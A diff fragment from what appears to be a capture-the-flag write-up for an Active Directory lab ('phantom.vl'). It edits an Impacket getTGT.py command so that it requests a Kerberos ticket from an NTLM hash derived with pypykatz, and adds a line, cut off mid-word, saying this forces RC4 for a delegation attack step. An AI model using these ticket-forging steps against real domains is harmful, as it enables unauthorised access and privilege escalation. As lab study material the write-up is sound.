@@ -682,13 +682,13 @@ Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies
 First ill read the attribute then write to it to set the delegation
 
 ```python
-getTGT.py phantom.vl/wsilva:'Password123!' 
+getTGT.py -hashes :$(pypykatz crypto nt 'Password123!') "phantom.vl/wsilva"
 Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 
 
 [*] Saving ticket in wsilva.ccache
 ```
 
-Then ill grab a TGT for the user configured for delegation
+Then ill grab a TGT for the user configured for delegation, i need to use pypykatz in the command to change the password into an NTLM, the use of an NTLM forces rc4, which inm t
 
 ```python
 describeTicket.py wsilva.ccache 
